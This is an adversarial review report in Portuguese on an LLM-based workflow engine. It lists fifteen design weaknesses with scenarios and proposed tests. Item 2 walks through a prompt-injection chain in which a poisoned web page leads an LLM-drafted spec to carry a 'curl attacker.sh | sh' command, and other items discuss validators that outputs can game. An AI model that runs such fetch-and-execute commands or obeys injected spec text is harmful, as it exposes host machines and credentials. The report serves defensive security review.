# Red-team — Relatório do Revisor Adversarial (Fable)

> Data: 2026-07-03. Fontes: os 5 docs do brief + sondagem direta no código
> (`motor/motor/grafo.py`, `curador.py`, `spec.py`, `exemplos/lift-docs-metafabrica.json`).
> Cada item: fraqueza · cenário · como testar. **[E]** = tenho evidência (código/doc citado).
> **[S]** = suspeito (plausível, não confirmado). Lista de candidatos — o Arquiteto verifica.
> Ordenação: severidade × probabilidade.

---

## 1. [E] A trava "não-certificado" não existe no código — o vazamento não é risco, é o default

**Fraqueza.** `DECISAO §7` e `EVOLUCAO V7` prometem: run MVP sai "marcado não-certificado"
e "fora do corpus do curador". `grep -r "certificad"` no `motor/` retorna **zero** ocorrências
em `.py`. Não há flag na spec, no evento, na telemetria. E `curador.carregar_runs(caminhos)`
consome **qualquer** JSONL que receber — não há filtro possível porque não há marca.

**Cenário.** Hoje, qualquer run com gates soltos (as opções `--auto`, escalada off etc. já
existem) grava telemetria idêntica à de um run pleno. O curador perfila modelos e propõe
mudanças de catálogo sobre um corpus que já mistura rascunho e certificado. A "trava honesta
anti-collapse" é, no estado atual, só prosa — e o problema piora silenciosamente a cada run
barato antes de a marca ser construída.

**Teste.** (a) Confirmar o grep. (b) Rodar uma missão com gates soltos e verificar se algum
campo do JSONL a distingue de uma run plena. (c) Ver se `analisar()` do curador tem qualquer
critério de exclusão. Se (b) e (c) derem negativo: a decisão V7 está descoberta e o corpus
atual pode já estar contaminado — vale auditar a telemetria existente antes da fatia 3.

---

## 2. [E] O nó `ferramenta`/`test` executa comando arbitrário vindo da spec, sem sandbox

**Fraqueza.** `grafo.py:600–624`: o comando vem da spec como template
(`comando_tpl.format_map(valores)`), passa por `shlex.split` e roda via `subprocess.run` **no
host do motor**, sem allowlist, sem sandbox, sem usuário separado. A spec é dado — e, pela
decisão de autoria-como-run, especs passam a ser **redigidas por LLM** a partir de pesquisa
de mercado (conteúdo de internet).

**Cenário.** Cadeia completa de injeção: página de pesquisa envenenada → síntese incorpora
instrução → rascunho de WorkflowSpec contém nó `ferramenta` com
`comando: "curl attacker.sh | sh"` — plausível, disfarçado de "rodar suíte" → humano aprova a
spec (é longa, o gate humano vira carimbo, ver item 9) → execução arbitrária na máquina que
tem as credenciais dos provedores. A direção "runners heterogêneos sempre-ligados" multiplica
a superfície: mais máquinas, mais credenciais, mesmo modelo de confiança. "Músculo, não
autoridade" **não protege aqui** — a separação de autoridade (Jarvis) limita dinheiro/
identidade, não impede RCE no músculo.

**Teste.** (a) Escrever uma spec com `comando` malicioso benigno (`touch /tmp/pwned`) e ver se
algo bloqueia. (b) Verificar se autoria-como-run tem qualquer sanitização/allowlist prevista
para nós ferramenta no rascunho. (c) Ameaça-modelo dos runners: listar que credenciais moram
em cada máquina e o que um nó ferramenta alcança. Mitigação óbvia a avaliar: allowlist de
executáveis por runner + spec de autoria não pode emitir nó `ferramenta` sem revisão elevada.

---

## 3. [E] O "lift do RAG 0/3→3/3" é quase tautológico — mede papagaio, não maestria

**Fraqueza.** `exemplos/lift-docs-metafabrica.json`: o validador é `contem` com 7 jargões
("prevenção", "escalada de tier", "reconciliação na fonte"…, `min: 5`) — e o RAG injeta 8
chunks **dos próprios docs que contêm essas strings**. O experimento mede: "com o texto na
janela, o modelo repete ≥5 termos do texto?" Sem RAG o modelo não conhece o jargão (0/3);
com RAG, copiar já passa (3/3). `_validar_contem` é substring casefold (`grafo.py:265`).

**Cenário.** Esse resultado sustenta duas decisões de peso: "conhecimento antes de peso
**validado**" e a justificativa de **começar a data-house agora**. Se o lift é essencialmente
capacidade de copiar contexto, ele não prevê o caso de uso real (responder algo que exige
*combinar* o corpus, não citá-lo) — e a data-house é um investimento grande lastreado numa
métrica fraca.

**Teste.** Barato: (a) re-rodar com validador que exija informação **derivada** e ausente
literal do corpus (ex.: pergunta cuja resposta cruza dois docs; validador `schema_json` sobre
uma resposta estruturada, ou juiz com gabarito escondido do executor). (b) Controle negativo:
injetar chunks *irrelevantes* que contenham os jargões — se 3/3 se mantém, a métrica mede
presença de string, não uso do conhecimento. Nota: o lift ainda pode ser real; o ponto é que
**esta** evidência não o estabelece.

---

## 4. [E] O curador não tem dimensão "workflow/versão" — a certificação por evidência não tem pipeline de dados

**Fraqueza.** `DECISAO §5`: "cada versão carrega a evidência de como performou (do livro-razão
do curador)". Mas `curador.py` agrega por **papel × tier × modelo** e por run
(`_finalizar_papel_tier`, `_finalizar_modelos`, `_finalizar_slot_modelo`) — não existe eixo
template/versão-de-workflow. A telemetria carrega `missao`, não `template@versao`.

**Cenário duplo.** (a) "v3 bateu v2 em custo e qualidade fica registrado" — hoje não há onde
registrar nem de onde derivar; a certificação nasce sem régua. (b) **Erro de atribuição
sistemático**: um workflow mal desenhado gera reprovações que o curador contabiliza como
fraqueza de *modelo* → propõe escalar modelo → custo sobe → a causa real (o template) fica
invisível e ainda ganha "evidência" de que precisa de modelos caros. É o modo de falha
silencioso da seleção do orquestrador (item 7) também: template errado vira "modelo fraco".

**Teste.** (a) Confirmar no schema de eventos se `template`/`versao` existem em algum evento.
(b) Experimento de atribuição: mesmo modelo, duas versões do mesmo workflow (uma sabotada com
rubrica ruim) — ver se alguma vista do curador distingue as duas ou se tudo cai na conta do
modelo.

---

## 5. [E] `contem` é gameável por construção — e a autoria-como-run acopla quem produz a quem valida

**Fraqueza.** O validador `contem` aprova qualquer saída que contenha as substrings — inclusive
a saída "aqui estão os termos: prevenção, escalada de tier, …". Pior: na autoria-como-run, o
**mesmo processo** redige o objetivo do executor, a rubrica E a config do validador. A
tendência natural (gradiente de menor esforço do LLM) é gerar validadores que a saída esperada
satisfaz trivialmente — Goodhart embutido no nascimento do workflow. O editor rejeita
"validador que se auto-valida" (caso sintático), mas não este acoplamento semântico.

**Cenário.** Com o tempo, o catálogo enche de workflows cujos gates determinísticos têm alta
taxa de aprovação — lido como "qualidade", é na verdade "régua frouxa". E `EVOLUCAO` já admite:
"validador mal escrito vira falso conforto". O agravante: são exatamente esses aprovados que
alimentarão o flywleel de treino.

**Teste.** (a) Ataque direto: modelo fraco instruído a "apenas listar as palavras-chave da
rubrica" — passa no gate? (b) Métrica de régua: para cada validador do catálogo, gerar N
saídas sabidamente ruins (mutação) e medir taxa de escape. Validador com escape alto é
decorativo. (c) Regra candidata: validador de um workflow autorado exige revisão por processo
independente do que redigiu o executor.

---

## 6. [S] Guardrail de sombra: n=1 é cara-ou-coroa, e n suficiente é proibitivo

**Fraqueza.** "Melhor/pior vem da sombra" assume que uma comparação v2 vs. v3 é informativa.
Runs de LLM têm variância alta (modelo, temperatura, esgotamento de provedor, escalada
estocástica). Uma sombra n=1 detecta apenas diferenças enormes; para detectar 10–15 p.p. de
aprovação-de-1ª precisa-se de dezenas de pares — custo que dobra/multiplica cada edição de
workflow. Há também o problema do insumo: sombra roda **qual** missão? A mesma de ontem
(não representa as próximas) ou um benchmark fixo (que satura e vira alvo de Goodhart)?

**Cenário.** Dois desfechos prováveis, ambos ruins: o usuário ignora a sombra ("caro demais,
eu sei o que estou fazendo" — e o guardrail vira teatro), ou confia em n=1 e "certifica" ruído
("v3 venceu" numa moeda jogada uma vez). O selo "certificado por sombra" da interface passa a
carregar confiança que o dado não sustenta.

**Teste.** Com a telemetria que **já existe**: calcular a variância entre-runs das métricas-
chave (aprovação 1ª, custo, latência) para a mesma spec; daí derivar o N mínimo para um teste
com poder razoável. Se N×custo-por-run > o valor da decisão, o guardrail como especificado
não fecha a conta — precisa de desenho estatístico (métricas pareadas, testes sequenciais,
ou sombra só para mudanças grandes) antes da fatia 3, não depois.

---

## 7. [S] Seleção de template pelo Orquestrador: sem feedback, erra em silêncio e a culpa vai para os modelos

**Fraqueza.** A seleção é roteamento LLM sobre metadados "quando usar" — texto livre, escrito
pelo autor do template. Não há evento `template.selecionado` com avaliação posterior de acerto,
nem métrica de seleção. Com 3 templates é trivial; com 30 (o catálogo é para crescer), os
"quando usar" se sobrepõem e a seleção vira o elo não-medido de um sistema que se orgulha de
medir tudo.

**Cenário.** Missão de pesquisa cai no template de software; os nós reprovam por razões que
parecem de qualidade; reconciliação e escalada queimam custo; o digest sai medíocre; o curador
atribui aos modelos (item 4). Ninguém — nenhum dado — aponta "template errado". Falha
silenciosa perfeita: o sistema fica *mais caro* e *aparentemente* precisa de modelos melhores.

**Teste.** (a) Conjunto de 20 missões rotuladas à mão com o template correto; medir acurácia
de seleção do orquestrador hoje. (b) Verificar se existe qualquer evento que registre a
seleção + justificativa (se não existe, é requisito ao schema de eventos antes do catálogo
crescer).

---

## 8. [S] Partida a frio da autoria-como-run: o primeiro elo é opinião de LLM com selo de processo

**Fraqueza.** A circularidade que o brief pergunta existe, mas o ponto de quebra é específico:
o workflow de autoria (pesquisa→síntese→spec) **não tem validador determinístico do que
importa**. Schema válido ≠ processo bom. O gate real da v1 de qualquer template é o olho do
fundador lendo uma spec longa produzida por síntese de pesquisa — exatamente o tipo de
artefato "plausível-errado" que o método manda desconfiar. E a evidência que corrigiria isso
só chega depois de N runs, medida por um curador que hoje não tem eixo de workflow (item 4).

**Cenário.** Template de design v1 nasce de pesquisa de mercado genérica; parece profissional;
é catalogado; 15 missões rodam sobre ele antes de haver sinal acumulado; o custo do erro de
desenho é pago 15 vezes. Compare com o único template que funciona hoje — o dev-harness — que
NÃO nasceu de autoria-como-run, nasceu de consenso humano codificado à mão. O único dado
disponível sobre "de onde vêm templates bons" aponta contra o mecanismo proposto.

**Teste.** Barato e revelador: rodar a autoria-como-run para um domínio que o Caio domina
(software — onde a resposta certa é conhecida: o próprio dev-harness) e comparar o rascunho
gerado com o template real. O delta mede o que a autoria-como-run entrega vs. promete.

---

## 9. [S] O humano é o gargalo que a arquitetura multiplica — e "decisao.timeout" já confessa isso

**Fraqueza.** Função-objetivo: minimizar tempo-até-decisão do humano. Mas cada mecanismo novo
**adiciona** decisões ao mesmo humano: gates de run, propostas do curador, certificação de
versões, aprovação de rascunhos de autoria, promoção de modelos em sombra, decisões de runner.
O evento `decisao.timeout` existe no schema — o próprio design já prevê que o humano não
responde a tempo. Caixa única + decisão individual obrigatória (sem approve em massa) é
correto para segurança e incompatível com 2–3 fábricas em paralelo.

**Cenário.** Com volume, o fundador desenvolve o reflexo de carimbar (aprovar sem ler o
`motivo` longo) — e aí os gates humanos, que são a última linha contra os itens 2, 5 e 8,
viram teatro de segurança. O sistema fica *formalmente* human-in-the-loop e *efetivamente*
autônomo, o pior dos dois mundos.

**Teste.** Na telemetria atual: decisões humanas por run × tempo mediano de resposta.
Projetar para 3 projetos paralelos com as fontes novas de pendência (curador, autoria,
sombra). Se a conta passa de ~15–20 decisões significativas/dia, o desenho precisa de
delegação por classe de risco (o que hoje é anti-escopo — tensão real com a fronteira Jarvis)
antes de escalar volume.

---

## 10. [S] "Artefato tipado com proveniência" valida forma, não significado — a inconsistência semântica atravessa

**Fraqueza.** Na fronteira entre casas, `schema_json` garante shape; não garante unidades,
premissas, versões de dependência, convenções. O tipo declara "isto é uma voz/spec/código";
não declara "gerada com sample rate X assumindo runtime Y".

**Cenário.** A "voz" sai da casa criativa validada por schema; entra na software house; o
integrador consome assumindo outra convenção de encoding; tudo passa nos gates de forma; o
erro só aparece na integração final — que é exatamente a classe de inconsistência que o
handoff tipado prometia matar, um nível acima, com selo de conformidade.

**Teste.** Corpus de contrato adversarial: 10 artefatos válidos-por-schema e semanticamente
errados (unidade trocada, premissa divergente); medir quantos algum gate a jusante pega.
Direção de mitigação a avaliar: contrato = schema + **suite de exemplos executáveis**
(golden pairs entrada→saída) — na vertical software isso é barato; nas outras, é o teste de
se a composição entre casas é viável cedo ou é Later.

---

## 11. [E/S] Fração das verdades que os validadores capturam: hoje é sintaxe; a rubrica de qualidade real fica com o LLM

**Fraqueza.** [E] Os kinds reais são `schema_json` e `contem` (`spec.py:111`), mais ferramenta
exit_code/json. Correção lógica, segurança, "não inventou API" — nada disso é capturável pelos
kinds atuais; fica com verificador LLM e avaliador de cobertura, que são opinião. [S] O risco
não é a limitação (conhecida) — é a **contabilidade**: a interface e o discurso dão ao selo
"validador determinístico rodou" peso de "verdade objetiva" (brief de design §5.1: "gate
duro"), quando o que ele afirma é estreitíssimo. Falso conforto por rotulagem.

**Cenário.** Digest mostra "validadores: 4/4 ✓"; fundador aprova rápido; os 4 eram schema +
substrings; o código no artefato nem compila. O selo verde disse a verdade sobre quase nada.

**Teste.** Para uma missão real de software: listar as propriedades que definiriam "pronto"
(compila, testes novos passam, lint, sem regressão) e marcar quais os validadores atuais
cobrem. A fração descoberta é o tamanho do conforto falso. Mitigação óbvia já apontada nos
docs (gate externo de CI) — o ataque é: **até lá, o selo deveria dizer o que valida**, ou a
UI está vendendo confiança não lastreada.

---

## 12. [E] "A spec é dado, não programa" já foi violado num ponto: template de comando com interpolação

**Fraqueza.** `comando_tpl.format_map(valores)` (`grafo.py:601`) é código-em-dado: a spec
carrega uma linha de shell com placeholders preenchidos em runtime. É exatamente o começo do
que `EVOLUCAO` chama de "spec virando linguagem de programação" — e é o vetor do item 2.

**Cenário.** Precedente estabelecido: o próximo caso de uso "só precisa" de um condicional no
comando, depois de um pipe, depois de env vars… A fronteira "topologia certificada, spec
livre" não tem análogo para a dimensão *poder de execução* da spec — topologia é vigiada,
capacidade de executar não é.

**Teste.** Decisão explícita a provocar: definir o que um nó ferramenta PODE carregar
(allowlist de binários? comando fixo no registro do runner, spec só referencia por nome?).
Se a resposta for "qualquer string", o item 2 é permanente.

---

## 13. [S] A tese do especialista pequeno tem um teste mais barato do que os docs assumem — e não foi rodado

**Fraqueza.** Os docs tratam a prova como Later (precisa de fine-tune governado, data-house,
grader). Mas a versão fraca da tese — "pequeno + RAG + ferramentas bate generalista em
custo+qualidade numa tarefa estreita **já medida**" — é testável hoje, sem treinar nada: o
gate determinístico existe, o livro-razão existe, o roteamento por modelo existe.

**Cenário de refutação barata.** Tarefa: o transformador CSV→JSON (ou o nó mais estreito do
Logisti). Braços: (a) modelo pequeno free + RAG do dev-harness + ferramenta; (b) generalista
topo. N=20 por braço. Se (a) não bate (b) nem aqui — na tarefa mais estreita, com o grader
mais barato, com conhecimento injetado — a tese central do flywheel precisa de revisão antes
de qualquer investimento em data-house/fine-tune. Se bate, é o primeiro dado real a favor.

**Teste.** É o cenário acima; custo estimado: horas, não semanas. O ponto adversarial: **por
que isso ainda não rodou**, se toda a infraestrutura de medição necessária é dada como pronta?
A resposta provável ("as missões reais ainda são poucas") reforça o item 14.

---

## 14. [S] Risco-mãe confirmado pelo formato do próprio pacote: a razão superfície/validação está invertida

**Fraqueza.** Evidência dos docs: 1 run real ponta-a-ponta citado como validação da Fase C;
missão-brinquedo (CSV→JSON) como caso canônico; e, sobre isso, um brief de interface de 600+
linhas (board, editor, 3D, retratos IA, personas, datahouse, runners), catálogo, autoria,
composição entre casas. A suíte ~262 prova que o código faz o que o código diz — não que o
processo entrega valor em projeto real. Dogfooding declarado ("Logisti é a fornalha") vs.
backlog efetivo (interface, catálogo, board) apontam para lados diferentes.

**Cenário.** Seis semanas de construção de superfície; a primeira missão real de porte revela
que (ex.) a rubrica de cobertura não discrimina em artefatos grandes, ou que o custo por run
real é 20× o do brinquedo — e a superfície inteira foi calibrada para o brinquedo.

**Teste.** Falsificável e imediato: definir **a próxima missão real** (Logisti, porte médio,
com validador de CI de verdade) como gate de TODO item novo de interface além do P0 mínimo.
Se a regra parecer cara demais de seguir, isso é o dado: o projeto prefere largura — e aí o
risco-mãe não é risco, é escolha.

---

## 15. [S] Livro-razão: $ real depende de tabela de preço manual que ninguém reconcilia

**Fraqueza.** `_calcular_usd` usa `precos.json` opcional fornecido à mão. Preço de provedor
muda; free tier tem custo oculto (tempo, 429, retries — o tempo está no ledger, mas não é
precificado); ninguém compara ledger vs. fatura.

**Cenário.** Curador propõe alocação por ROI com preços defasados 30%; a "conta de ROI" que
justificaria treinar especialista herda o erro. Decisões de catálogo sistematicamente
enviesadas na direção do erro da tabela.

**Teste.** Reconciliação mensal: soma do ledger vs. fatura real por provedor. Delta >10% =
o ledger informa tendência, não decisão. Barato de automatizar; se não existir, toda
afirmação "$ real" nos docs deveria ser rebaixada para "$ estimado".

---

## Resumo da priorização

| # | Item | Sev × Prob | Status |
|---|---|---|---|
| 1 | "Não-certificado" não existe no código | crítico × certo | Evidência |
| 2 | Execução arbitrária via nó ferramenta | crítico × médio | Evidência |
| 3 | Lift do RAG quase tautológico | alto × alto | Evidência |
| 4 | Curador sem eixo workflow/versão | alto × certo | Evidência |
| 5 | `contem` gameável + acoplamento autor/validador | alto × alto | Evidência |
| 6 | Sombra: n=1 é ruído, n real é caro | alto × alto | Suspeita |
| 7 | Seleção de template sem feedback | alto × médio | Suspeita |
| 8 | Partida a frio da autoria | médio × alto | Suspeita |
| 9 | Humano-gargalo / carimbo | alto × médio | Suspeita |
| 10 | Contrato tipado ≠ contrato semântico | médio × médio | Suspeita |
| 11 | Selo determinístico vende confiança larga com cobertura estreita | médio × alto | Evid.+Susp. |
| 12 | Spec já carrega código (comando template) | médio × certo | Evidência |
| 13 | Tese do especialista tem teste barato não rodado | médio × — | Suspeita |
| 14 | Largura sobre profundidade: razão superfície/validação invertida | alto × alto | Suspeita |
| 15 | Tabela de preço sem reconciliação | baixo × alto | Suspeita |

Interações perigosas (compostos): **1+5+6** = corpus contaminado, medido por régua frouxa,
certificado por ruído — é o caminho exato para o flywheel degradar em silêncio, que é o
cenário que os princípios pétreos mais juram evitar. **2+8+9** = spec autorada por LLM com
poder de execução, aprovada por humano em modo carimbo. **4+7** = todo erro de desenho de
processo é cobrado na conta dos modelos, para sempre invisível.
